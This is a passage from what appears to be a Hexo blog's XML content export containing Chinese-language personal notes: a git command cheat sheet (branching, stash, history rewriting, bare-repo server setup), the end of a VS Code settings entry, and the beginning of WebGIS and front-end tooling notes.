class="attr">&quot;emmet.showAbbreviationSuggestions&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;emmet.triggerExpansionOnTab&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;tabout.disableByDefault&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!--more-->]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
          <category> 配置 </category>
          
          <category> vscode配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git命令</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/git%E5%91%BD%E4%BB%A4/git%E5%91%BD%E4%BB%A4/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/git%E5%91%BD%E4%BB%A4/git%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git <span class="built_in">add</span> [fil]</span><br><span class="line">git commit -m <span class="string">&#x27;    &#x27;</span></span><br><span class="line"></span><br><span class="line">git remote <span class="built_in">add</span> [origin] [<span class="built_in">URL</span>]</span><br><span class="line">git push -u [origin] [master]</span><br><span class="line">git push [origin] [master]</span><br><span class="line"></span><br><span class="line">git remote -v</span><br><span class="line">git remote rm [origin]</span><br><span class="line">git remote <span class="built_in">set</span>-url origin [<span class="built_in">URL</span>] [URL_old]</span><br><span class="line"></span><br><span class="line">git clone [SSH/<span class="built_in">URL</span>]</span><br><span class="line">git pull == git fetch+git <span class="built_in">merge</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="comment">-- &lt;file&gt;  撤销修改(回到版本库/回调添加到暂存区后的状态)</span></span><br><span class="line">git reset HEAD &lt;<span class="built_in">file</span>&gt;   撤销暂存区修改(先回退到版本最新，再用checkout 才可以撤销修改)</span><br><span class="line"></span><br><span class="line">git reset <span class="comment">--hard [HEAD^^^^/[commit id]]</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">log</span> <span class="comment">--graph --pretty=oneline --abbrev-commit  查看分支 </span></span><br><span class="line">git reflog         记录命令</span><br><span class="line">git diff HEAD <span class="comment">-- [filename]     查看工作区和git版本库里最新版本的差异</span></span><br><span class="line">git diff <span class="comment">-- [filename]  (工作区与暂存区/版本库的差异)</span></span><br><span class="line"></span><br><span class="line">git rebase  分叉的提交变成直线</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git remote rm origin   删除远程地址</span><br><span class="line">git remote <span class="built_in">add</span> origin [git url]  添加远程地址</span><br><span class="line"><span class="comment"># 或者 git remote origin set-url [new git url] 重置？远程地址</span></span><br><span class="line"><span class="comment"># 或者直接修改 ./git/config 中的 url 参数</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="添加SSH-Key"><a href="#添加SSH-Key" class="headerlink" title="添加SSH Key"></a>添加<code>SSH Key</code></h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#创建SSH Key (有id_rsa和id_rsa.pub文件可跳过)</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxxxxxx&quot;</span></span><br><span class="line"><span class="meta">#在(Linux or windows) .ssh 目录下有两个文件，id_rsa是私钥，不能泄漏，id_rsa.pub 是公钥，可以告知别人</span></span><br><span class="line"><span class="meta">#GitHub在 &quot;Add SSH Key&quot; 粘贴 &quot;id_rsa.pub&quot; 的文件内容即可同步</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><ul><li>创建与合并分支<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git checkout -<span class="keyword">b</span> <span class="symbol">&lt;name1&gt;</span>  创建并切换分支( 增加dev指针)</span><br><span class="line">==&gt; git brabch <span class="symbol">&lt;name1&gt;</span>    创建</span><br><span class="line"></span><br><span class="line">    git checkout <span class="symbol">&lt;name1&gt;</span>  切换</span><br><span class="line"></span><br><span class="line">提交分支   无区别</span><br><span class="line"></span><br><span class="line">git merge (--<span class="keyword">no</span>-ff) <span class="symbol">&lt;name1&gt;</span> (-<span class="keyword">m</span> <span class="string">&#x27;&#x27;</span>)合并某分支到当前分支(所以先切回主线)</span><br><span class="line">git branch -d <span class="symbol">&lt;name1&gt;</span>  删除分支</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git branch   查看当前分支</span><br></pre></td></tr></table></figure></li></ul><h3 id="常见使用场景"><a href="#常见使用场景" class="headerlink" title="常见使用场景"></a>常见使用场景</h3><h4 id="解决冲突-gt-本地分支合并"><a href="#解决冲突-gt-本地分支合并" class="headerlink" title="解决冲突 -&gt; 本地分支合并"></a>解决冲突 -&gt; 本地分支合并</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//创建分支<span class="number">1</span>，修改后提交<span class="number">1</span></span><br><span class="line">    git checkout -b feature1</span><br><span class="line">    //修改 readme.txt 文件</span><br><span class="line">    git <span class="keyword">add</span> readme.txt</span><br><span class="line">    git <span class="keyword">commit</span> -m <span class="string">&#x27;branch feature1&#x27;</span></span><br><span class="line">//切回主分支，提交<span class="number">2</span></span><br><span class="line">    git checkout master</span><br><span class="line">    //修改 readme.txt 文件 (与第一次修改不同)</span><br><span class="line">    git <span class="keyword">add</span> readme.txt</span><br><span class="line">    git <span class="keyword">commit</span> -m <span class="string">&#x27;branch master&#x27;</span></span><br><span class="line">//merge失败，解决冲突后，重新提交</span><br><span class="line">    git merge feature1  // (-X ours/theirs)</span><br><span class="line">    //提示发生冲突的文件，和解决后再把结果提交</span><br><span class="line">        //Merge <span class="keyword">conflict</span> <span class="keyword">in</span> readme.txt</span><br><span class="line">        //fix <span class="keyword">conflict</span> <span class="keyword">and</span> <span class="keyword">then</span> <span class="keyword">commit</span> the result</span><br><span class="line">        //git status 也可以告诉我们冲突的文件</span><br><span class="line">    //修改 readme.txt 文件</span><br><span class="line">    git <span class="keyword">add</span> readme.txt</span><br><span class="line">    git <span class="keyword">commit</span> -m <span class="string">&#x27;conflict fixed&#x27;</span></span><br><span class="line">//查看分支合并情况</span><br><span class="line">    git <span class="keyword">log</span> <span class="comment">--graph --pretty=oneline --abbrev-commit  </span></span><br></pre></td></tr></table></figure><h4 id="场景-解决冲突-gt-推送修改"><a href="#场景-解决冲突-gt-推送修改" class="headerlink" title="场景: 解决冲突 -&gt; 推送修改"></a>场景: 解决冲突 -&gt; 推送修改</h4><pre><code><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>当你推送origin/dev分支时，已经有人推送了他的提交，此时你推送失败</span><br><span class="line">    git push origin dev</span><br><span class="line">        <span class="regexp">//</span>failed to push some refs to <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="regexp">//</span>Updates were rejected because the tip of your curent branch <span class="keyword">in</span> behind </span><br><span class="line">        <span class="regexp">//</span><span class="string">&#x27;git pull ...&#x27;</span>   before pushing again</span><br><span class="line"><span class="regexp">//</span>此时先同步最新提交，在本地合并，解决冲突，再推送</span><br><span class="line">    git pull</span><br><span class="line">        <span class="regexp">//</span>失败  没有指定本地 dev 分支与远程 origin/dev 分支的链接</span><br><span class="line">        git branch --set-upstream-to--origin/dev dev</span><br><span class="line">        git pull</span><br><span class="line">    <span class="regexp">//</span>然后解决冲突，和 解决冲突 -&gt; 本地分支 一样</span><br></pre></td></tr></table></figure></code></pre><h4 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Fast forward 模式合并时，删除分支会丢掉分支信息</span><br><span class="line">所以可以强制禁用Fast forward</span><br><span class="line">git merge --no-ff -m &#x27;merge with no ff&#x27; dev</span><br><span class="line"></span><br><span class="line">分支策略</span><br><span class="line"><span class="number">1</span>，<span class="literal">master</span>分支    需remote,稳定，仅用来发布新版本</span><br><span class="line"><span class="number">2</span>，dev分支       需remote,不稳定，测试稳定后提交到<span class="keyword">master</span></span><br><span class="line"><span class="title">3</span>，Bug分支       本地即可，  修改bug</span><br><span class="line"><span class="number">4</span>，feature分支   与人合作则remote, 开发新功能， 合并到dev?</span><br></pre></td></tr></table></figure><ul><li><p>Bug分支(用完即删 no ff)</p>  <figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git stash   储藏当前工作现场</span><br><span class="line">切换分支修Bug(没有stash，会导致当前未提交的文件还在)</span><br><span class="line">完成，切回之前分支</span><br><span class="line">git stash list</span><br><span class="line">git stash apply    git stash drop</span><br><span class="line">=&gt;git stash pop (恢复且丢弃stash)</span><br><span class="line">git stash apply [stash@&#123;<span class="number">0</span>&#125;]</span><br><span class="line">不填就是stash@&#123;<span class="number">0</span>&#125;(最新stash)   存取类似栈(先进后出)</span><br></pre></td></tr></table></figure></li><li><p>feature分支  (开发新功能用)</p><ul><li>其他，如何删除未合并的分支 <code>git branch -D feature-vulcan</code></li></ul></li><li><p>多人协作</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br><span class="line">git <span class="built_in">push</span> <span class="built_in">origin</span> dev  (<span class="built_in">origin</span>:仓库地址,dev：分支)</span><br><span class="line"></span><br><span class="line">git checkout -b dev <span class="built_in">origin</span>/dev  ①创建远程分支</span><br><span class="line">git pull   ②拉取分支</span><br></pre></td></tr></table></figure></li></ul><h4 id="stash应用：Bug-修复"><a href="#stash应用：Bug-修复" class="headerlink" title="stash应用：Bug 修复"></a><code>stash</code>应用：Bug 修复</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">当你需要在分支master上修复一个代号101的bug的任务时，当前正在dev上进行的工作还没有提交,你需要：</span><br><span class="line">1. 保存当前分支的工作现场</span><br><span class="line"><span class="code">    git stash</span></span><br><span class="line">此时会保存当前工作区，并回退到最近的一次提交的工作区上。</span><br><span class="line">2. 切换到需要修复Bug的master分支,创建一个临时分支 issue-101</span><br><span class="line"><span class="code">    git checkout master</span></span><br><span class="line"><span class="code">    git checkout -b issue-101</span></span><br><span class="line">3. 在临时分支上修复Bug后提交</span><br><span class="line">4. 切换回master分支，进行合并</span><br><span class="line"><span class="code">    git checkout master</span></span><br><span class="line"><span class="code">    git merge --no-ff -m &quot;mergedbug fix 101&quot; issue-101</span></span><br><span class="line">5. 切回 dev ，恢复之前保存的工作区，继续之前的工作</span><br><span class="line"><span class="code">    git stash list    （是）</span></span><br><span class="line"><span class="code">    git stash apply + git stash drop</span></span><br><span class="line"><span class="section">==  git stash pop</span></span><br><span class="line">(git stash apply stash@&#123;0&#125;   恢复指定的stash)</span><br></pre></td></tr></table></figure><h4 id="分支删除与恢复"><a href="#分支删除与恢复" class="headerlink" title="分支删除与恢复"></a>分支删除与恢复</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">git</span> <span class="selector-tag">branch</span> <span class="selector-tag">-d</span> <span class="selector-attr">[branchName]</span>  <span class="comment">//删除分支</span></span><br><span class="line"><span class="selector-tag">git</span> <span class="selector-tag">reflog</span>   查看删除分支的 <span class="selector-attr">[commit_id]</span></span><br><span class="line"><span class="selector-tag">git</span> <span class="selector-tag">branch</span> <span class="selector-tag">books_temp</span> <span class="selector-attr">[comit_id]</span></span><br></pre></td></tr></table></figure><h4 id="在版本库中永久删除文件-包括历史记录"><a href="#在版本库中永久删除文件-包括历史记录" class="headerlink" title="在版本库中永久删除文件(包括历史记录)"></a>在版本库中永久删除文件(包括历史记录)</h4><p><strong><a href="https://www.cnblogs.com/shines77/p/3460274.html">参考网址</a></strong><br></p><ol><li><p>资料库中删除文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">filter</span>-branch --force --<span class="built_in">index</span>-<span class="built_in">filter</span> <span class="string">&#x27;git rm --cached --ignore-unmatch [path-to-your-remove-file]&#x27;</span> --prune-<span class="built_in">empty</span> --<span class="keyword">tag</span>-name-<span class="built_in">filter</span> <span class="keyword">cat</span> -- --<span class="keyword">all</span></span><br><span class="line">-----</span><br><span class="line"><span class="number">1</span>. 删除文件夹  rm 后需要加 -rf</span><br><span class="line"><span class="number">2</span>. [path-<span class="keyword">to</span>-your-<span class="built_in">remove</span>-<span class="keyword">file</span>]  路径不能以<span class="string">&#x27;/&#x27;</span>开头，否则回从 git 安装目录开始(举例： books/books1/....)</span><br><span class="line"><span class="number">3</span>. 可以建立 bash 脚本文件进行批量删除</span><br><span class="line">    #!/bin/bash</span><br><span class="line">    git <span class="built_in">filter</span>-branch --force --<span class="built_in">index</span>-<span class="built_in">filter</span> <span class="string">&#x27;git rm --cached --ignore-unmatch projects/Moon.mp3&#x27;</span> --prune-<span class="built_in">empty</span> --<span class="keyword">tag</span>-name-<span class="built_in">filter</span> <span class="keyword">cat</span> -- --<span class="keyword">all</span></span><br><span class="line">    git <span class="built_in">filter</span>-branch --force --<span class="built_in">index</span>-<span class="built_in">filter</span> <span class="string">&#x27;git rm --cached --ignore-unmatch sound/Music_*.mp3&#x27;</span> --prune-<span class="built_in">empty</span> --<span class="keyword">tag</span>-name-<span class="built_in">filter</span> <span class="keyword">cat</span> -- --<span class="keyword">all</span></span><br></pre></td></tr></table></figure></li><li><p>推送我们修改后的repo （与重建相比知识保留了原有的更新记录）(如果没有推送到远程，此步骤)</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//以强制覆盖的方式推送</span><br><span class="line">git push origin <span class="keyword">master</span> <span class="title">--force</span> --all</span><br><span class="line">// 让打了 <span class="keyword">tag</span> <span class="title">的版本中页删除文件或文件夹， 强制推送 Git</span> tags</span><br><span class="line">git push origin <span class="keyword">master</span> <span class="title">--force</span> --tags</span><br></pre></td></tr></table></figure></li><li><p>清理和回收空间</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm -rf <span class="string">.git/refs/original/</span></span><br><span class="line">git reflog expire <span class="params">--expire=now</span> <span class="params">--all</span></span><br><span class="line">git gc <span class="params">--prune=now</span></span><br><span class="line">git gc <span class="params">--aggressive</span> <span class="params">--prune=now</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="分支合并时不把分支的commit记录合并到master的记录中"><a href="#分支合并时不把分支的commit记录合并到master的记录中" class="headerlink" title="分支合并时不把分支的commit记录合并到master的记录中"></a>分支合并时不把分支的<code>commit</code>记录合并到<code>master</code>的记录中</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在dev1分支中，有多个commit记录,此时软重置到最开始的记录</span></span><br><span class="line">git reset HEAD~n (n 可以是commit提交次数<span class="number">-1</span>)</span><br><span class="line"><span class="comment"># 重新提交</span></span><br><span class="line">git <span class="built_in">add</span> -A</span><br><span class="line">git commit -m <span class="string">&#x27;dev1 first commit&#x27;</span></span><br><span class="line"><span class="comment"># 切换到master分支，合并</span></span><br><span class="line">git <span class="built_in">merge</span> <span class="comment">--no-ff -m &#x27;merge dev1&#x27; dev1</span></span><br><span class="line"><span class="comment"># 完成并查看</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment">--graph --pretty=oneline --abbrev-commit</span></span><br></pre></td></tr></table></figure><h4 id="服务器-centos-建立远程仓库"><a href="#服务器-centos-建立远程仓库" class="headerlink" title="服务器(centos)建立远程仓库"></a>服务器(centos)建立远程仓库</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>添加账户</span><br><span class="line">adduser git</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>使用密码或者添加证书</span><br><span class="line">passwd git  <span class="regexp">//</span>设置密码</span><br><span class="line">建立存放文件 <span class="regexp">/home/gi</span>t<span class="regexp">/.ssh/</span>authorized_keys  <span class="regexp">//</span>需要登录的用户公钥</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>初始化仓库</span><br><span class="line">git init --bare smaple.git</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>权限管理</span><br><span class="line">chown -R git:git smaple.git</span><br><span class="line">git:x:<span class="number">1000</span>:<span class="number">1000</span>:,,,:<span class="regexp">/homt/gi</span>t:<span class="regexp">/bin/gi</span>t-bash  <span class="regexp">//</span>更改文件 <span class="regexp">/etc/</span>passwd</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>克隆远程仓库</span><br><span class="line">git clone git@server:srv/sample.git</span><br></pre></td></tr></table></figure><h5 id="清空主分支提交记录"><a href="#清空主分支提交记录" class="headerlink" title="清空主分支提交记录"></a>清空主分支提交记录</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//新建分支，删除已有主分支，新分支改名，强制更新远程库</span><br><span class="line">git checkout --orphan master_bk</span><br><span class="line">git add -A</span><br><span class="line">git commit -m &#x27;new commit&#x27;</span><br><span class="line">git branch -D <span class="keyword">master</span>   <span class="title">//强制删除分支</span></span><br><span class="line"><span class="title">git</span> branch -m <span class="keyword">master</span></span><br><span class="line"><span class="title">git</span> push -f origin <span class="literal">master</span></span><br></pre></td></tr></table></figure><h5 id="提交修改-GitHub账号"><a href="#提交修改-GitHub账号" class="headerlink" title="提交修改 GitHub账号"></a>提交修改 GitHub账号</h5><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看全局仓库下用户名和邮箱</span></span><br><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> user<span class="variable">.email</span></span><br><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> user<span class="variable">.name</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改全局仓库下用户名和邮箱</span></span><br><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> user<span class="variable">.email</span>   “邮箱”</span><br><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> user<span class="variable">.name</span>  “用户名”</span><br></pre></td></tr></table></figure><h5 id="复制公钥不能生效的办法-未测试"><a href="#复制公钥不能生效的办法-未测试" class="headerlink" title="复制公钥不能生效的办法(未测试)"></a>复制公钥不能生效的办法(未测试)</h5><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">authorized_keys 更改文件权限：664--&gt;644 ？</span><br><span class="line">更改 <span class="string">.ssh</span> 文件夹的拥有者为 git</span><br><span class="line">chmod 644 <span class="string">.ssh</span> </span><br><span class="line">chown git<span class="function">:git</span> <span class="string">.ssh</span></span><br></pre></td></tr></table></figure><h5 id="其他无关：centos-更改用户密码"><a href="#其他无关：centos-更改用户密码" class="headerlink" title="其他无关：centos 更改用户密码"></a>其他无关：centos 更改用户密码</h5><p>su -c [command]<br>adduser [username]<br>passwd [username]</p><p><a href="https://www.jianshu.com/p/b357df6794e3">成功的git模型</a></p><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="git-add-u-A-的区别"><a href="#git-add-u-A-的区别" class="headerlink" title="git add -u -A . 的区别"></a><code>git add -u -A . </code>的区别</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3种操作:修改已有文件、添加新文件、删除文件</span><br><span class="line">git <span class="builtin-name">add</span> -A   保存所有的修改 (常用)</span><br><span class="line">git <span class="builtin-name">add</span> -u   保存修改和删除，不添加新文件(常用)</span><br><span class="line">git <span class="builtin-name">add</span> .    保存修改和添加新文件，不包括删除(少用)</span><br></pre></td></tr></table></figure><h3 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h3><p><code>git status</code>中文乱码：<code>git config --global core.quotepath false</code></p>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
          <category> git命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知乎专栏webgis教程笔记</title>
      <link href="/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%9F%A5%E4%B9%8E%E4%B8%93%E6%A0%8Fwebgis%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%9F%A5%E4%B9%8E%E4%B8%93%E6%A0%8Fwebgis%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://xiaozhuanlan.com/topic/8753146092">参考网址</a></p><h2 id="常用-JS-库"><a href="#常用-JS-库" class="headerlink" title="常用 JS 库"></a>常用 JS 库</h2><h3 id="地图-JS-库"><a href="#地图-JS-库" class="headerlink" title="地图 JS 库"></a>地图 JS 库</h3><p>常用的JS库：<code>ArcGIS API for JavaScript</code>、<code>OpenLayers</code>、<code>Leaflet</code>、<code>Mapbox</code>、<code>maptalks.js</code>等。</p><ul><li>ArcGIS API for JavaScript: 大公司</li><li>OpenLayers: 开源，可进行二次开发和封装定制，没有提供3D功能，可以与 Cesium 实现三维（<a href="https://github.com/openlayers/ol-cesium">ol3-cesium</a>）。<strong>必学</strong></li><li>Leaflet: 开源，轻量级，简单易用，较多的开源插件。<strong>易用</strong></li><li>Mapbox: 算是增强版 <code>Leaflet</code>，手机移动端体验好，3D GIS 渲染效果好。</li><li>其他: 高德、百度、腾讯。提供了很多基础数据。<span id="more"></span><h3 id="可视化图表库"><a href="#可视化图表库" class="headerlink" title="可视化图表库"></a>可视化图表库</h3>推荐免费的<code>Echarts</code>，<code>D3.JS</code>多用于复杂图形和3D可视化效果。</li></ul><h2 id="前端工程化"><a href="#前端工程化" class="headerlink" title="前端工程化"></a>前端工程化</h2><p>前端工程化内容主要有：前端规范化、模块化、组件化、自动化等。<br><br><a href="https://github.com/giscafer/front-end-manual/issues/26">别人的经验</a></p><h3 id="规范化"><a href="#规范化" class="headerlink" title="规范化"></a>规范化</h3><p>使用一些工具：<code>esLint</code>、<code>tsLint</code>、<code>jsLint</code>、<code>jsHint</code>、<code>StyleLint</code></p><h3 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h3><p>原生JavaScript <a href="https://wangdoc.com/javascript">(入门教程)</a> =&gt; ES6 <a href="http://es6.ruanyifeng.com/">(教程)</a></p><h3 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h3><p>重复的工作就可以提炼出来组件化，组件化多了，结合规范化，慢慢的就有了组件库。<br><br>非业务的组件，比如 UI组件库，<code>easyui</code>、<code>layui</code>、<code>BootStrap</code>、<code>ant-design</code>、<code>primeng</code>、<code>iView</code>。<br> 还有其他。</p><h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>目前已经达到成熟程度的自动化是组件自动化<strong>测试</strong>，前端工程自动化<strong>打包</strong>，自动化<strong>构建</strong>，自动化<strong>部署</strong>，H5页面编辑器。</p><h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><h3 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h3><h3 id="Http-server-快速部署前端静态页面"><a href="#Http-server-快速部署前端静态页面" class="headerlink" title="Http-server 快速部署前端静态页面"></a>Http-server 快速部署前端静态页面</h3><h3 id="json-server-模块"><a href="#json-server-模块" class="headerlink" title="json-server 模块"></a>json-server 模块</h3><p>在前端快速创建 REST API接口，简单的说就是增删改查的接口。（不用写后端）</p><h4 id="下载-install-json-server"><a href="#下载-install-json-server" class="headerlink" title="下载(install json-server)"></a>下载(install json-server)</h4><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul><li>新建文件<code>db.json</code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;posts&quot;</span>:[</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>:<span class="number">1</span>, <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;webgis 入门&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>:<span class="number">2</span>, <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;json-server&quot;</span>&#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;comments&quot;</span>:[</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>:<span class="number">1</span>, <span class="attr">&quot;body&quot;</span>: <span class="string">&quot;some comment&quot;</span>, <span class="attr">&quot;postId&quot;</span>: <span class="number">1</span>&#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;profile&quot;</span>: &#123;<span class="attr">&quot;name&quot;</span>: <span 